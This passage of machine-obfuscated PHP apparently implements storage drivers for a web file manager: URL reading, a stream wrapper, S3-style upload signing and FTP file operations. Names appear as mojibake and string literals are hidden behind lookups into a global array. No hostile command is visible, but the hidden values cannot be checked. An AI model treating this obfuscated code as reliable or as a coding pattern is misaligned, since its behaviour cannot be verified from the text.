? strtotime($‘È Éôà[$ƒ©ŠÖƒĞ[1763]]) : $¡„ë„¥[$ƒ©ŠÖƒĞ[1728]]; return $¡„ë„¥; } protected function _isFolder($ˆ²úô¶) { $Š©ÁÏ ó =& $_SERVER[”øäÃÍª]; if ($ˆ²úô¶ == $Š©ÁÏ ó[12] || $ˆ²úô¶ == $Š©ÁÏ ó[8]) { return !0; } $Ó‡çËŒÕ = $this->_objectMeta($ˆ²úô¶); return isset($Ó‡çËŒÕ[$Š©ÁÏ ó[33]]) && $Ó‡çËŒÕ[$Š©ÁÏ ó[33]] == $Š©ÁÏ ó[78] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($™˜çÇ×‚ = false) { } public function exist($¼Óè›ÑÃ) { $úÏÄî†â = $this->info($¼Óè›ÑÃ); return $úÏÄî†â[$_SERVER[”øäÃÍª][232]]; } public function isFile($Õ¥±œØí) { $ó©‡Ã¶‰ = $this->info($Õ¥±œØí); return $ó©‡Ã¶‰[$_SERVER[”øäÃÍª][232]]; } public function isFolder($“›Æş÷ö) { return !1; } public function size($Şş÷ê†Ê) { $ß¾şÄşƒ = $this->info($Şş÷ê†Ê); return $ß¾şÄşƒ[$_SERVER[”øäÃÍª][79]]; } public function info($Ôúì§úß) { return $this->infoParse($Ôúì§úß); } public function infoAuth($÷¨ÉØ¼) { return $this->infoParse($÷¨ÉØ¼); } public function infoWithChildren($Î’¸ë²) { return $this->infoParse($Î’¸ë²); } public function infoFull($‘®Ÿ«¹²) { return $this->infoParse($‘®Ÿ«¹²); } private function infoParse($àæ¬äñš) { $ÆØ”ÚÕƒ =& $_SERVER[”øäÃÍª]; $£—ç”÷ƒ = $this->header($àæ¬äñš); if (!$£—ç”÷ƒ || !$£—ç”÷ƒ[$ÆØ”ÚÕƒ[859]]) { return !1; } $İ”á÷ƒ” = _get($£—ç”÷ƒ, $ÆØ”ÚÕƒ[412], 0); $éã™–ê» = array($ÆØ”ÚÕƒ[32] => $£—ç”÷ƒ[$ÆØ”ÚÕƒ[32]], $ÆØ”ÚÕƒ[87] => $àæ¬äñš, $ÆØ”ÚÕƒ[33] => $ÆØ”ÚÕƒ[230], $ÆØ”ÚÕƒ[79] => intval($İ”á÷ƒ”), $ÆØ”ÚÕƒ[166] => get_path_ext($£—ç”÷ƒ[$ÆØ”ÚÕƒ[32]]), $ÆØ”ÚÕƒ[1618] => $İ”á÷ƒ” > 0 && $£—ç”÷ƒ[$ÆØ”ÚÕƒ[1764]], $ÆØ”ÚÕƒ[1619] => !1); return $éã™–ê»; } private function header($¢„¯‘˜õ) { $Ë¿ş¬³ù =& $_SERVER[”øäÃÍª]; if (isset(self::$_cacheHeader[$¢„¯‘˜õ])) { return self::$_cacheHeader[$¢„¯‘˜õ]; } $œ…ùê÷… = isset($GLOBALS[$Ë¿ş¬³ù[1765]]) ? $GLOBALS[$Ë¿ş¬³ù[1765]] : !1; $GLOBALS[$Ë¿ş¬³ù[1765]] = !0; self::$_cacheHeader[$¢„¯‘˜õ] = url_header($¢„¯‘˜õ); $GLOBALS[$Ë¿ş¬³ù[1765]] = $œ…ùê÷…; return self::$_cacheHeader[$¢„¯‘˜õ]; } public function hashSimple($ˆ¿ü±”ä, $£§©ğÏ³ = false) { $öÚŞµ— =& $_SERVER[”øäÃÍª]; $ò§àñ· = $this->info($ˆ¿ü±”ä); if (!$ò§àñ· || !$ò§àñ·[$öÚŞµ—[232]]) { return !1; } $ğùŸ = $ò§àñ·[$öÚŞµ—[79]]; $Óû—úºÅ = 200; $½”ğùçŒ = 50; if ($ğùŸ <= $Óû—úºÅ * $½”ğùçŒ) { return md5($this->fileSubstr($ˆ¿ü±”ä, 0, $ğùŸ)) . $ğùŸ; } $š´óªô = intval($ğùŸ / $½”ğùçŒ); $«Ö‘è› = $öÚŞµ—[12]; $ÁÁ¼£Ê‹ = timeFloat(); $º‰ìÃÔş = 15; for ($“Ç­å³Ù = 0; $“Ç­å³Ù < $½”ğùçŒ; $“Ç­å³Ù++) { if (timeFloat() - $ÁÁ¼£Ê‹ > $º‰ìÃÔş) { return !1; } $Ç…¼¼µŠ = $this->fileSubstr($ˆ¿ü±”ä, $š´óªô * $“Ç­å³Ù, $Óû—úºÅ); if (!$Ç…¼¼µŠ) { return !1; } $«Ö‘è› .= $Ç…¼¼µŠ; } $«Ö‘è› .= $this->fileSubstr($ˆ¿ü±”ä, $ğùŸ - $Óû—úºÅ, $Óû—úºÅ); return md5($«Ö‘è›) . $ğùŸ; } public function getContent($³è²é’ı) { return $this->fileSubstr($³è²é’ı); } public function fileSubstr($Õ…¼³²¹, $À¯ãÀà = 0, $…±™ğÆ£ = -1) { $Šìª–õ… =& $_SERVER[”øäÃÍª]; $’ÁÅ¹ç = $this->info($Õ…¼³²¹); if (!$’ÁÅ¹ç || !$’ÁÅ¹ç[$Šìª–õ…[232]] && $’ÁÅ¹ç[$Šìª–õ…[79]] > 1024 * 1024 * 10) { return !1; } if ($…±™ğÆ£ === -1) { $…±™ğÆ£ = $’ÁÅ¹ç[$Šìª–õ…[79]]; } if ($…±™ğÆ£ == 0) { return $Šìª–õ…[12]; } $ğñ‚ùÇš = array($Šìª–õ…[1766] . $À¯ãÀà . $Šìª–õ…[898] . ($À¯ãÀà + $…±™ğÆ£ - 1)); $”„¼¢ÓÄ = url_request($Õ…¼³²¹, $Šìª–õ…[1561], !1, $ğñ‚ùÇš, !1, !1, 30); return $”„¼¢ÓÄ[$Šìª–õ…[1345]] ? $”„¼¢ÓÄ[$Šìª–õ…[1345]] : $Šìª–õ…[12]; } public function download($åî©ŞøÌ, $—Ç¹¾‡ï) { Downloader::start($åî©ŞøÌ, $—Ç¹¾‡ï); return $—Ç¹¾‡ï; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_fopenCache = array(); static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($†äıˆŒÛ, $· øÏÜö = '') { $this->info = $this->info($†äıˆŒÛ); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[”øäÃÍª][87]]; $this->pathOpen = $†äıˆŒÛ; if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$†äıˆŒÛ])) { self::$_chunkBuffer[$†äıˆŒÛ] = array(); } self::$_fopenCache[$this->pathOpen] = $this; return $this->info ? !0 : !1; } function stream_read($ì‘ÚŞ•Ü) { $®ı¬ôÁ = $this->fileSubstr($this->pose, $ì‘ÚŞ•Ü); $this->pose += strlen($®ı¬ôÁ); return $®ı¬ôÁ; } public function stream_tell() { return $this->pose; } public function stream_seek($–Ëğ¯›, $£’§Ö³) { $ĞÙ„áĞ =& $_SERVER[”øäÃÍª]; if ($£’§Ö³ == SEEK_SET) { $this->pose = $–Ëğ¯›; } else { if ($£’§Ö³ == SEEK_CUR) { $this->pose += $–Ëğ¯›; } else { if ($£’§Ö³ == SEEK_END) { $this->pose = $this->info[$ĞÙ„áĞ[79]] + intval($–Ëğ¯›); } } } if ($–Ëğ¯› < 0) { $this->pose = $this->info[$ĞÙ„áĞ[79]] + $–Ëğ¯›; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[”øäÃÍª][79]]; } public function stream_close() { unset(self::$_fopenCache[$this->pathOpen]); return !0; } public function url_stat($«¡ôİñÅ, $ÈŒÁ™Ğí) { $¨ä¾«í =& $_SERVER[”øäÃÍª]; $çŠÛòš = $this->info($«¡ôİñÅ); return array($¨ä¾«í[1467] => 0, $¨ä¾«í[1767] => 0, $¨ä¾«í[16] => 32768 + 511, $¨ä¾«í[1768] => 0, $¨ä¾«í[1769] => 0, $¨ä¾«í[1770] => 0, $¨ä¾«í[1771] => 0, $¨ä¾«í[79] => $çŠÛòš[$¨ä¾«í[79]], $¨ä¾«í[1772] => $çŠÛòš[$¨ä¾«í[1617]], $¨ä¾«í[1729] => $çŠÛòš[$¨ä¾«í[88]], $¨ä¾«í[1728] => $çŠÛòš[$¨ä¾«í[231]], $¨ä¾«í[1773] => 0, $¨ä¾«í[1774] => 0); } static $fileInfo = array(); public function info($¶ÀšÆ¼) { $¾Ğ¦Úó = $_SERVER[”øäÃÍª][1775]; if (isset(self::$fileInfo[$¶ÀšÆ¼])) { return self::$fileInfo[$¶ÀšÆ¼]; } if (substr($¶ÀšÆ¼, 0, strlen($¾Ğ¦Úó)) != $¾Ğ¦Úó) { return !1; } self::$fileInfo[$¶ÀšÆ¼] = IO::info(substr($¶ÀšÆ¼, strlen($¾Ğ¦Úó))); return self::$fileInfo[$¶ÀšÆ¼]; } public static function read($í‰™òÄ†, $³êğ‰Ì, $–®Ô‹®¶) { if (!isset(self::$_fopenCache[$í‰™òÄ†])) { $úŸ†‹ó˜ = new StreamWrapperIO(); $úŸ†‹ó˜->stream_open($í‰™òÄ†); self::$_fopenCache[$í‰™òÄ†] = $úŸ†‹ó˜; } $úŸ†‹ó˜ = self::$_fopenCache[$í‰™òÄ†]; return $úŸ†‹ó˜->fileSubstr($³êğ‰Ì, $–®Ô‹®¶); } public static function _read($¨Ûƒëøİ, $ó©İ Áç, $¹Ê†Ü‚Ğ) { $“û¸ò¶£ =& $_SERVER[”øäÃÍª]; $Ó€ï˜–„ = fopen($¨Ûƒëøİ, $“û¸ò¶£[1621]); if (!$Ó€ï˜–„) { return $“û¸ò¶£[12]; } $Éƒ¹Â— = 8192; fseek($Ó€ï˜–„, $ó©İ Áç, SEEK_SET); $²şêÇÕö = $“û¸ò¶£[12]; $µæî¸å³ = 0; while ($µæî¸å³ < $¹Ê†Ü‚Ğ) { $¹ŞÖ¨Âà = min($Éƒ¹Â—, $¹Ê†Ü‚Ğ - $µæî¸å³); $²şêÇÕö .= fread($Ó€ï˜–„, $¹ŞÖ¨Âà); $µæî¸å³ += $¹ŞÖ¨Âà; } fclose($Ó€ï˜–„); return $²şêÇÕö; } public function fileSubstr($ÄÚ¼É†£, $ ¶¨•§¬) { $¶‡À†‚× =& $_SERVER[”øäÃÍª]; $ùøÕ­óÌ = $this->info[$¶‡À†‚×[79]]; $¸ñĞ¿ñÇ = $ÄÚ¼É†£; $¬ßäå = $ ¶¨•§¬; if ($ÄÚ¼É†£ < 0) { $ÄÚ¼É†£ = $ùøÕ­óÌ + $ÄÚ¼É†£; } if ($ ¶¨•§¬ === !1) { $ ¶¨•§¬ = $ùøÕ­óÌ - $ÄÚ¼É†£; } if ($ÄÚ¼É†£ + $ ¶¨•§¬ > $ùøÕ­óÌ) { $ ¶¨•§¬ = $ùøÕ­óÌ - $ÄÚ¼É†£; } if ($ ¶¨•§¬ <= 0) { return $¶‡À†‚×[12]; } if ($ÄÚ¼É†£ < 0 || $ÄÚ¼É†£ >= $ùøÕ­óÌ || $ ¶¨•§¬ <= 0 || $ ¶¨•§¬ > 1024 * 1024 * 10) { throw new Exception("\x69\x6f\106\151\x6c\145\x52\x65\x61\144\x20\x65\162\162\157\x72\x21\40\x73\x74\x61\162\x74\x3d{$ÄÚ¼É†£}\73\154\145\x6e\x67\164\x68\x3d{$ ¶¨•§¬}\x3b\x20\163\151\x7a\145\75{$ùøÕ­óÌ}\73"); } $¿’ÜßÂÄ = 64 * 1024; $òãûæ‚ =& self::$_chunkBuffer[$this->path]; if (!$òãûæ‚) { $òãûæ‚ = array(); } $¨µ±¬©ê = 0; $Æ÷ÀëÛ = 0; $ªÂÈì–² = $¶‡À†‚×[12]; foreach ($òãûæ‚ as $¨µ±¬©ê => $ªÂÈì–²) { $¨µ±¬©ê = intval($¨µ±¬©ê); $Æ÷ÀëÛ = $¨µ±¬©ê + strlen($ªÂÈì–²); if ($ÄÚ¼É†£ >= $Æ÷ÀëÛ) { continue; } if ($ÄÚ¼É†£ >= $¨µ±¬©ê && $ÄÚ¼É†£ + $ ¶¨•§¬ <= $Æ÷ÀëÛ) { return substr($ªÂÈì–², $ÄÚ¼É†£ - $¨µ±¬©ê, $ ¶¨•§¬); } break; } if (count($òãûæ‚) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($¶‡À†‚×[1776], $¶‡À†‚×[1777] . count($òãûæ‚) . "\x3b\x73\164\141\162\164\x3d{$ÄÚ¼É†£}\x2c\x6c\x65\x6e\147\164\x68\75{$ ¶¨•§¬}\x3b\160\x6f\163\x65\x3a{$¨µ±¬©ê}\176{$Æ÷ÀëÛ}"); throw new Exception($¶‡À†‚×[1778]); } $ËĞéŞŒ = intval($ÄÚ¼É†£ / $¿’ÜßÂÄ) * $¿’ÜßÂÄ; $®é³¸Æ = ceil(($ÄÚ¼É†£ + $ ¶¨•§¬) / $¿’ÜßÂÄ) * $¿’ÜßÂÄ - $ËĞéŞŒ; $œ²¼¯¶ = IO::fileSubstr($this->path, $ËĞéŞŒ, $®é³¸Æ); $òãûæ‚[$ËĞéŞŒ . $¶‡À†‚×[12]] = $œ²¼¯¶; ksort($òãûæ‚); $¨èßÇúİ = substr($œ²¼¯¶, $ÄÚ¼É†£ - $ËĞéŞŒ, $ ¶¨•§¬); return $¨èßÇúİ; } private function log($Ì‘öÍ¯È, $ŸÄ•ÒÑ£) { $âœ®åê® =& $_SERVER[”øäÃÍª]; $¤Ëî¡ê = timeFloat() - $this->timeStart; write_log(sprintf($âœ®åê®[1779], $Ì‘öÍ¯È, $this->info[$âœ®åê®[32]], $¤Ëî¡ê, $ŸÄ•ÒÑ£), $âœ®åê®[1323]); } } goto fÕĞ˜ Ÿ½; c£³«‰òÉ¥: class PathDriverEOS extends PathDriverBaseS3 { public function __construct($ãÙßúÕ) { parent::__construct($ãÙßúÕ); $this->setSignVersion($_SERVER[”øäÃÍª][247]); } public function uploadFormData($×ªÆ¼œ½, $×¡üªÔ = 3600) { $Ç±ËÃê =& $_SERVER[”øäÃÍª]; $õËÊãÜí = $Ç±ËÃê[229]; $©ĞÆïÇ = $Ç±ËÃê[257]; $±©£øÄÍ = $Ç±ËÃê[62]; $ÅÜ³¤Çú = gmdate($Ç±ËÃê[258]); $¾Ë¤×İ = gmdate($Ç±ËÃê[259]); $ñ¡”·¤ô = $Ç±ËÃê[260]; $‘ûÉÍüİ = $×¡üªÔ . $Ç±ËÃê[12]; $ØËŠçÒ = $Ç±ËÃê[261]; $Ü¸é¼à = array($this->accessKey, $¾Ë¤×İ, $this->region, $±©£øÄÍ, $ñ¡”·¤ô); $¬ ÷ŞŞ‚ = implode($Ç±ËÃê[8], $Ü¸é¼à); $ÅâÌ¡› = array($Ç±ËÃê[262] => gmdate($Ç±ËÃê[1480], strtotime($Ç±ËÃê[264])), $Ç±ËÃê[265] => array(array($Ç±ËÃê[266] => $this->bucket), array($Ç±ËÃê[306] => $õËÊãÜí), array($Ç±ËÃê[267], $Ç±ËÃê[268], $Ç±ËÃê[12]), array($Ç±ËÃê[267], $Ç±ËÃê[269], $Ç±ËÃê[12]), array($Ç±ËÃê[267], $Ç±ËÃê[307], $Ç±ËÃê[12]), array($Ç±ËÃê[270] => $ØËŠçÒ), array($Ç±ËÃê[271] => $¬ ÷ŞŞ‚), array($Ç±ËÃê[272] => $©ĞÆïÇ), array($Ç±ËÃê[273] => $ÅÜ³¤Çú), array($Ç±ËÃê[274] => $‘ûÉÍüİ))); $¶íÌ“øÕ = base64_encode(json_encode($ÅâÌ¡›)); $®×éÀˆú = hash_hmac($Ç±ËÃê[275], $¾Ë¤×İ, $Ç±ËÃê[276] . $this->secret, !0); $ÆÏŸùßâ = hash_hmac($Ç±ËÃê[275], $this->region, $®×éÀˆú, !0); $’¢—²¾Ò = hash_hmac($Ç±ËÃê[275], $±©£øÄÍ, $ÆÏŸùßâ, !0); $á®É£ˆÁ = hash_hmac($Ç±ËÃê[275], $ñ¡”·¤ô, $’¢—²¾Ò, !0); $”Æå‡å¡ = hash_hmac($Ç±ËÃê[275], $¶íÌ“øÕ, $á®É£ˆÁ); $‹¥õæä = array($Ç±ËÃê[246] => $Ç±ËÃê[12], $Ç±ËÃê[294] => $Ç±ËÃê[12], $Ç±ËÃê[306] => $õËÊãÜí, $Ç±ËÃê[270] => $ØËŠçÒ, $Ç±ËÃê[277] => $¶íÌ“øÕ, $Ç±ËÃê[308] => $¬ ÷ŞŞ‚, $Ç±ËÃê[309] => $©ĞÆïÇ, $Ç±ËÃê[310] => $ÅÜ³¤Çú, $Ç±ËÃê[311] => $‘ûÉÍüİ, $Ç±ËÃê[312] => $”Æå‡å¡, $Ç±ËÃê[206] => $this->getHost()); return $‹¥õæä; } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\61"; public $config = array(); public function __construct($‘ƒÖ¹œÄ) { parent::__construct(); if (count($‘ƒÖ¹œÄ) > 0) { $this->_init($‘ƒÖ¹œÄ); } } public function __destruct() { if (!$this->_isconn(!1)) { return !1; } return @ftp_close($this->connect); } private function charsetReset($Ğ–¼±¨É) { $ş¢ÙúÚŒ =& $_SERVER[”øäÃÍª]; global $config; $this->appCharset = $config[$ş¢ÙúÚŒ[1601]]; $this->systemCharset = $config[$ş¢ÙúÚŒ[1602]]; if (isset($Ğ–¼±¨É[$ş¢ÙúÚŒ[1603]]) && $Ğ–¼±¨É[$ş¢ÙúÚŒ[1603]]) { $this->systemCharset = $Ğ–¼±¨É[$ş¢ÙúÚŒ[1603]]; } } public function iconvApp($İİ¬¾Ñ†) { return $this->iconvTo($İİ¬¾Ñ†, $this->systemCharset, $this->appCharset); } public function iconvSystem($´¬ªÁ•ä) { return $this->iconvTo($´¬ªÁ•ä, $this->appCharset, $this->systemCharset); } public function getPathOuter($Ë¾ŸÑ®) { $Šâ›ïß” =& $_SERVER[”øäÃÍª]; $¶Å›¹¤Æ = $this->iconvApp($this->pathBase); $Ë¾ŸÑ® = $this->iconvApp($Ë¾ŸÑ®); if (substr($¶Å›¹¤Æ, 0, 2) == $Šâ›ïß”[1478]) { $¶Å›¹¤Æ = BASIC_PATH . substr($¶Å›¹¤Æ, 2); } if (substr($Ë¾ŸÑ®, 0, 2) == $Šâ›ïß”[1478]) { $Ë¾ŸÑ® = BASIC_PATH . substr($Ë¾ŸÑ®, 2); } $¶Å›¹¤Æ = KodIO::clear($¶Å›¹¤Æ); $Ë¾ŸÑ® = KodIO::clear($Ë¾ŸÑ®); $Ë¾ŸÑ® = substr($Ë¾ŸÑ®, strlen($¶Å›¹¤Æ)); if (empty($this->pathDriver)) { return $Ë¾ŸÑ®; } return $this->pathDriver . $Šâ›ïß”[8] . ltrim($Ë¾ŸÑ®, $Šâ›ïß”[8]); } private function _init($œ»Çûİ = array()) { $²‘ñùš® =& $_SERVER[”øäÃÍª]; if (!function_exists($²‘ñùš®[1604])) { throw new Exception(LNG($²‘ñùš®[1605])); } $this->config = $œ»Çûİ; $this->charsetReset($œ»Çûİ); foreach ($œ»Çûİ as $«Ä•œÒ… => $êé …ÆÇ) { if (isset($this->{$«Ä•œÒ…})) { $this->{$«Ä•œÒ…} = $êé …ÆÇ; } } return $this->_login($œ»Çûİ); } private function _login($‚¬óİ²) { $Ÿë‰À¡© =& $_SERVER[”øäÃÍª]; static $Î»ÅÓĞ¶ = array(); $€Ë¤Ó = md5(json_encode($‚¬óİ²)); if (isset($Î»ÅÓĞ¶[$€Ë¤Ó])) { foreach ($Î»ÅÓĞ¶[$€Ë¤Ó] as $ğèÎù¿Ø => $·ÕÃˆë) { $this->{$ğèÎù¿Ø} = $·ÕÃˆë; } return !0; } $Ü†œî”ş = parse_url(trim($this->server, $Ÿë‰À¡©[8])); $this->host = $Ü†œî”ş[$Ÿë‰À¡©[206]]; $ùÚÄÛ† = isset($Ü†œî”ş[$Ÿë‰À¡©[205]]) && $Ü†œî”ş[$Ÿë‰À¡©[205]] == $Ÿë‰À¡©[1606] ? !0 : !1; $this->scheme = $ùÚÄÛ† ? $Ÿë‰À¡©[1607] : $Ÿë‰À¡©[1608]; $this->port = isset($Ü†œî”ş[$Ÿë‰À¡©[207]]) ? $Ü†œî”ş[$Ÿë‰À¡©[207]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 30); if ($this->connect === !1) { $this->writeLog(LNG($Ÿë‰À¡©[1609]) . $this->host . $Ÿë‰À¡©[4] . $this->port, !0); return !1; } $˜èÓ³Ü = @ftp_login($this->connect, $this->username, $this->userpass); if (!$˜èÓ³Ü) { $this->writeLog(LNG($Ÿë‰À¡©[1610]) . $this->username, !0); return !1; } $this->ftpPath = @ftp_pwd($this->connect); @ftp_chdir($this->connect, $Ÿë‰À¡©[8]); @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $éŒá¬² = $this->pasv == $Ÿë‰À¡©[91] ? !0 : !1; @ftp_pasv($this->connect, $éŒá¬²); $Î»ÅÓĞ¶[$€Ë¤Ó] = array($Ÿë‰À¡©[1611] => $this->connect, $Ÿë‰À¡©[206] => $this->host, $Ÿë‰À¡©[205] => $this->scheme, $Ÿë‰À¡©[207] => $this->port); return $˜èÓ³Ü; } private function _isconn($Ğ©Ó÷Š’ = true) { if (is_resource($this->connect)) { return !0; } if (!$Ğ©Ó÷Š’) { return !1; } return $this->_login($this->config); } public function mkfile($ø«ÉáÉÖ, $°”‚ŠšÈ = '', $Š±Ã ®å = REPEAT_RENAME) { if ($this->setContent($ø«ÉáÉÖ, $°”‚ŠšÈ)) { return $this->getPathOuter($ø«ÉáÉÖ); } $this->writeLog(LNG($_SERVER[”øäÃÍª][1612]), !0); return !1; } public function mkdir($ãéŒ¤ë·, $ûï”Ê¨• = REPEAT_SKIP) { $ş«·ÓİÂ =& $_SERVER[”øäÃÍª]; if (!$ãéŒ¤ë· || $ãéŒ¤ë· == $ş«·ÓİÂ[8]) { return !0; } if (!$this->_isconn()) { return !1; } $ãéŒ¤ë· = $this->iconvSystem($ãéŒ¤ë·); if ($this->_isFolder($ãéŒ¤ë·) || @ftp_mkdir($this->connect, $ãéŒ¤ë·)) { return $this->getPathOuter($ãéŒ¤ë·); } if (!$this->mkdir($this->pathFather($ãéŒ¤ë·))) { return !1; } if ($ãéŒ¤ë· = @ftp_mkdir($this->connect, $ãéŒ¤ë·)) { return $this->getPathOuter($ãéŒ¤ë·); } $ğ¦•€– = __FUNCTION__ . $ş«·ÓİÂ[1613]; $this->writeLog($ğ¦•€–, !0); return !1; } public function copyFile($õô¹øÕì, $¯şš¨¾ø) { if (!$this->_isconn()) { return !1; } $ãÜ‘çˆ = $this->pathThis($this->iconvSystem($õô¹øÕì)); $ÂÖ“Ù•‘ = $this->tempFile($ãÜ‘çˆ); $—ÌÍ¶ôå = $this->iconvApp($ÂÖ“Ù•‘); $this->download($õô¹øÕì, $—ÌÍ¶ôå); $‘Ãİ€«™ = $this->upload($¯şš¨¾ø, $—ÌÍ¶ôå); $this->tempFileRemve($ÂÖ“Ù•‘); return $‘Ãİ€«™; } public function moveFile($¡ÑÓáèÇ, $ìç”ÇÁ) { if (!$this->_isconn()) { return !1; } $¡ÑÓáèÇ = $this->iconvSystem($¡ÑÓáèÇ); $ìç”ÇÁ = $this->iconvSystem($ìç”ÇÁ); $ É¿ÀÕ° = @ftp_rename($this->connect, $¡ÑÓáèÇ, $ìç”ÇÁ); if (!$ É¿ÀÕ°) { $this->writeLog(__FUNCTION__ . $_SERVER[”øäÃÍª][1613], !0); return !1; } return $this->getPathOuter($ìç”ÇÁ); } public function delFile($Áµ„×€Ş) { if (!$this->_isconn()) { return !1; } $Áµ„×€Ş = $this->iconvSystem($Áµ„×€Ş); $´ÓÙÖ­Â = @ftp_delete($this->connect, $Áµ„×€Ş); if (!$´ÓÙÖ­Â) { $this->writeLog(__FUNCTION__ . $_SERVER[”øäÃÍª][1613], !0); } return $´ÓÙÖ­Â; } public function delFolder($ãÌ†ğ·½) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $î˜ìÖ² = $ÑÈÙÒ¦æ = array(); $this->fileList($ãÌ†ğ·½, $î˜ìÖ², $ÑÈÙÒ¦æ, !0); $this->listItemCache = !0; foreach ($ÑÈÙÒ¦æ as $é˜Ö‡ò ) { $Ó»Æ£ = $this->iconvSystem($é˜Ö‡ò [$_SERVER[”øäÃÍª][32]]); $Ò£¥åş = @ftp_delete($this->connect, $Ó»Æ£); if (!$Ò£¥åş) { return !1; } } foreach ($î˜ìÖ² as $Ó»Æ£) { $Ó»Æ£ = $this->iconvSystem($Ó»Æ£); $Ò£¥åş = @ftp_rmdir($this->connect, $Ó»Æ£); if (!$Ò£¥åş) { return !1; } } $ãÌ†ğ·½ = $this->iconvSystem($ãÌ†ğ·½); return @ftp_rmdir($this->connect, $ãÌ†ğ·½); } public function rename($º‘ÌÀÈ, $ÑşäĞÇ²) { $Ï£®ÜÔµ =& $_SERVER[”øäÃÍª]; if (!$this->_isconn()) { return !1; } $îäüº¨€ = $this->fileNameAuto($this->pathFather($º‘ÌÀÈ), $ÑşäĞÇ²); $îäüº¨€ = $this->iconvSystem($îäüº¨€); $º‘ÌÀÈ = $this->iconvSystem($º‘ÌÀÈ); $ÊşäÂŸÓ = $this->pathFather($º‘ÌÀÈ); $ÈòûõÇÍ = rtrim($ÊşäÂŸÓ, $Ï£®ÜÔµ[8]) . $Ï£®ÜÔµ[8] . $îäüº¨€; $¼˜öÛÔ = @ftp_rename($this->connect, $º‘ÌÀÈ, $ÈòûõÇÍ); if (!$¼˜öÛÔ) { $this->writeLog(__FUNCTION__ . $Ï£®ÜÔµ[1613], !0); return !1; } $ÈòûõÇÍ = $this->iconvApp($ÈòûõÇÍ); return $this->getPathOuter($ÈòûõÇÍ); } private function folderInfo($Šáöô‘Ê, $¢Í‡à®À = false) { $¥Øİ¤çœ =& $_SERVER[”øäÃÍª]; $ë¢ÌÇÅä = array($¥Øİ¤çœ[32] => $this->pathThis($Šáöô‘Ê), $¥Øİ¤çœ[87] => $this->getPathOuter($¥Øİ¤çœ[8] . $Šáöô‘Ê), $¥Øİ¤çœ[33] => $¥Øİ¤çœ[78]); if ($¢Í‡à®À) { return $ë¢ÌÇÅä; } $ë¢ÌÇÅä[$¥Øİ¤çœ[231]] = $ë¢ÌÇÅä[$¥Øİ¤çœ[88]] = 0; $ë¢ÌÇÅä[$¥Øİ¤çœ[232]] = $ë¢ÌÇÅä[$¥Øİ¤çœ[233]] = !0; return $ë¢ÌÇÅä; } private function fileInfo($ŠÉŠÓˆù, $à¿Çû = false, $‘œŒÊ° = array()) { $âğÕÛëÑ =& $_SERVER[”øäÃÍª]; $¡¼õÌÓŸ = array($âğÕÛëÑ[32] => $this->pathThis($ŠÉŠÓˆù), $âğÕÛëÑ[87] => $this->getPathOuter($âğÕÛëÑ[8] . $ŠÉŠÓˆù), $âğÕÛëÑ[33] => $âğÕÛëÑ[230], $âğÕÛëÑ[79] => isset($‘œŒÊ°[$âğÕÛëÑ[79]]) ? $‘œŒÊ°[$âğÕÛëÑ[79]] : 0, $âğÕÛëÑ[166] => $this->ext($ŠÉŠÓˆù)); if ($à¿Çû) { return $¡¼õÌÓŸ; } $¡¼õÌÓŸ[$âğÕÛëÑ[231]] = $¡¼õÌÓŸ[$âğÕÛëÑ[88]] = 0; $¡¼õÌÓŸ[$âğÕÛëÑ[232]] = $¡¼õÌÓŸ[$âğÕÛëÑ[233]] = !0; $¿ŸüÆöâ = $this->iconvSystem($ŠÉŠÓˆù); $¡¼õÌÓŸ[$âğÕÛëÑ[88]] = @ftp_mdtm($this->connect, $¿ŸüÆöâ); if (empty($‘œŒÊ°)) { $‘œŒÊ° = $this->objectMeta($ŠÉŠÓˆù); if (!$‘œŒÊ°) { return $¡¼õÌÓŸ; } } $¡¼õÌÓŸ[$âğÕÛëÑ[79]] = $‘œŒÊ°[$âğÕÛëÑ[79]]; return $¡¼õÌÓŸ; } public function size($ä¶ªÑš) { $¤‘ı¦è¼ = $this->objectMeta($ä¶ªÑš); return $¤‘ı¦è¼ ? $¤‘ı¦è¼[$_SERVER[”øäÃÍª][79]] : 0; } public function info($ñ«§ìÌ‚) { if ($this->isFile($ñ«§ìÌ‚)) { return $this->fileInfo($ñ«§ìÌ‚, 0); } else { if ($this->isFolder($ñ«§ìÌ‚)) { return $this->folderInfo($ñ«§ìÌ‚); } } return !1; } private function fileList($ä™Ù±Òú, &$³Öî³õ¡, &$ÄÅßëèç, $¾¯¤¹•š = false) { $¢ö™¾äø =& $_SERVER[”øäÃÍª]; $ä™Ù±Òú = $this->iconvSystem($ä™Ù±Òú); if (!$this->isFolder($ä™Ù±Òú)) { return !1; } $ä™Ù±Òú = rtrim($ä™Ù±Òú, $¢ö™¾äø[8]) . $¢ö™¾äø[8]; check_abort(); $Ú•é–Ş§ = @ftp_rawlist($this->connect, $ä™Ù±Òú); if (!$Ú•é–Ş§) { $Ú•é–Ş§ = array(); } $ÅËÂÈà = array($¢ö™¾äø[10] => 1, $¢ö™¾äø[1423] => 1); foreach ($Ú•é–Ş§ as $ôÂÇÃŠş) { $å­¤–¨– = $this->_listItem($ôÂÇÃŠş); if ($å­¤–¨–[0] == $¢ö™¾äø[868]) { continue; } $ëä”«è = $å­¤–¨–[8]; if (empty($ëä”«è) && $ëä”«è !== $¢ö™¾äø[228] || isset($ÅËÂÈà[$ëä”«è])) { continue; } $ëä”«è = $this->iconvApp($ä™Ù±Òú . ltrim($ëä”«è, $¢ö™¾äø[8])); $µ±»ã‘Ç = array($¢ö™¾äø[32] => $ëä”«è, $¢ö™¾äø[33] => $¢ö™¾äø[230], $¢ö™¾äø[79] => $å­¤–¨–[4]); if (substr($ôÂÇÃŠş, 0, 1) == $¢ö™¾äø[1614]) { $µ±»ã‘Ç[$¢ö™¾äø[33]] = $¢ö™¾äø[78]; $µ±»ã‘Ç[$¢ö™¾äø[79]] = 0; } 